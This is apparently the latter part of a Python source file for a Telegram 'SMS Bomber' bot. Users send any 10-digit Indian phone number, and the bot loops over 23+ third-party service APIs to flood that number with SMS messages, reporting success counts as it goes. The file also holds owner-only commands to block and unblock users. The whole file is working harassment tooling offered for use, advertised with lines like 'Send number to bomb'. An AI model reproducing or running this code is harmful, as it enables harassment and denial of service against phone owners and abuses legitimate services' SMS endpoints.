                    headers=api_data['headers'],
                    json=api_data['data'],
                    timeout=15
                )
            else:
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    data=api_data['data'],
                    timeout=15
                )
        
        if response.status_code in [200, 201, 202, 204]:
            return True
        return False
    except:
        return False

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    add_user(user_id)
    
    keyboard = [
        [InlineKeyboardButton("📞 SEND NUMBER", callback_data="send_number")],
        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 SMS BOMBER BOT 🔥\n\n"
        "📌 Send any 10-digit number to start bombing\n"
        "Example: 9876543210\n\n"
        "⚡ 23+ Working APIs\n"
        "⚡ Real SMS Bombing\n"
        "⚡ Termux Level Bombing\n\n"
        "💀 @BeStChEaT_OwNeR",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number - REAL BOMBING"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    phone = update.message.text.strip()
    
    # Check if valid phone number
    if not re.match(r'^[0-9]{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid Number!\n\n"
            "Send 10-digit number only.\n"
            "Example: 9876543210"
        )
        return
    
    # Start bombing
    msg = await update.message.reply_text(
        f"📱 BOMBING STARTED!\n\n"
        f"🎯 Target: +91{phone}\n"
        f"⏳ Sending SMS to 23+ platforms...\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )
    
    apis = get_apis(phone)
    random.shuffle(apis)
    
    success = 0
    failed = 0
    services = []
    
    for i, api in enumerate(apis):
        if send_sms(api):
            success += 1
            service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
            services.append(service.capitalize())
        else:
            failed += 1
        
        # Update progress every 3 APIs
        if (i + 1) % 3 == 0:
            progress = int(((i + 1) / len(apis)) * 100)
            try:
                await msg.edit_text(
                    f"📱 BOMBING IN PROGRESS\n\n"
                    f"🎯 Target: +91{phone}\n"
                    f"✅ Success: {success}\n"
                    f"❌ Failed: {failed}\n"
                    f"⏳ Progress: {progress}% ({i+1}/{len(apis)})\n\n"
                    f"💀 @BeStChEaT_OwNeR"
                )
            except:
                pass
    
    # Final result
    result = (
        f"✅ BOMBING COMPLETE!\n\n"
        f"📞 Target: +91{phone}\n"
        f"📨 Total: {len(apis)}\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {failed}\n\n"
    )
    
    if services:
        unique_services = list(dict.fromkeys(services))
        result += f"🟢 Services: {', '.join(unique_services[:8])}\n\n"
    
    result += f"💀 @BeStChEaT_OwNeR"
    
    await msg.edit_text(result)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "send_number":
        await query.edit_message_text(
            "📞 SEND NUMBER\n\n"
            "Send your 10-digit number.\n"
            "Example: 9876543210\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "about":
        await query.edit_message_text(
            "ℹ️ ABOUT\n\n"
            "🤖 SMS Bomber Bot\n"
            "👨‍💻 @BeStChEaT_OwNeR\n"
            "📊 23+ APIs\n"
            "⚡ Real SMS Bombing\n"
            "⚡ Termux Level\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "status":
        db = load_db()
        total_users = len(db['users'])
        blocked_users = len(db['blocked'])
        
        await query.edit_message_text(
            f"📊 BOT STATUS\n\n"
            f"👥 Users: {total_users}\n"
            f"🚫 Blocked: {blocked_users}\n"
            f"📡 Status: Online\n"
            f"⚡ APIs: 23+\n\n"
            f"💀 @BeStChEaT_OwNeR"
        )

# --- Owner Commands ---

async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block a user - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /block USER_ID")
        return
    
    try:
        uid = int(args[0])
        if block_user(uid):
            await update.message.reply_text(f"✅ User {uid} blocked!")
        else:
            await update.message.reply_text(f"❌ User already blocked!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock a user - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /unblock USER_ID")
        return
    
    try:
        uid = int(args[0])
        if unblock_user(uid):
            await update.message.reply_text(f"✅ User {uid} unblocked!")
        else:
            await update.message.reply_text(f"❌ User not found in block list!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot statistics - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    db = load_db()
    total_users = len(db['users'])
    blocked_users = len(db['blocked'])
    
    await update.message.reply_text(
        f"📊 BOT STATISTICS\n\n"
        f"👥 Total Users: {total_users}\n"
        f"🚫 Blocked Users: {blocked_users}\n"
        f"📡 Status: Online\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user_id = update.effective_user.id
    
    if user_id == OWNER_ID:
        text = (
            "👑 OWNER COMMANDS\n\n"
            "/block USER_ID - Block user\n"
            "/unblock USER_ID - Unblock user\n"
            "/stats - Bot statistics\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    else:
        text = (
            "🤖 USER COMMANDS\n\n"
            "/start - Start bot\n"
            "9876543210 - Send number to bomb\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    await update.message.reply_text(text)

# --- Main Bot ---

def main():
    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("❌ Error: BOT_TOKEN not set!")
        return
    
    print("🤖 Starting SMS Bomber Bot (Termux Code Converted)...")
    print("🚀 Bot is running!")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    
    # Owner commands
    app.add_handler(CommandHandler("block", block_command))
    app.add_handler(CommandHandler("unblock", unblock_command))
    app.add_handler(CommandHandler("stats", stats_command))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    app.run_polling()

if __name__ == '__main__':
    main()
